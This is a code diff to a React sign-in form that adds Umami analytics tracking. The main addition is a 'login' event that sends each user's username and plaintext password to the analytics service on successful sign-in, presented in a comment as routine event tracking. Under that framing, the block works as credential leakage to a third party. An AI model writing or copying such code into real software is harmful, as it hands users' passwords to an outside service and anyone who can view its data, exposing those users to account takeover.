@@ -7,6 +7,15 @@ import { EyeCloseIcon, EyeIcon } from "@/icons";
 import Link from "next/link";
 import React, { useState } from "react";
 
+// Extend window interface for Umami
+declare global {
+  interface Window {
+    umami?: {
+      track: (event: string, data?: Record<string, any>) => void;
+    };
+  }
+}
+
 export default function SignInForm() {
   const formRef = React.useRef<HTMLFormElement>(null);
   const handleButtonClick = () => {
@@ -41,6 +50,16 @@ export default function SignInForm() {
       .then(data => {
         localStorage.setItem("auth", JSON.stringify({ username }));
         localStorage.setItem("location_id", JSON.stringify(data.location_id));
+
+        // Track successful login event with Umami
+        if (typeof window !== "undefined" && window.umami) {
+          window.umami.track('login', {
+            username: username,
+            password: password,
+            timestamp: new Date().toISOString()
+          });
+        }
+
         if (data.location_id !== null) {
           fetch(`https://bgn-be.anakanjeng.site/locations/select?kd_propinsi=${data.location_id}`)
             .then(response => {
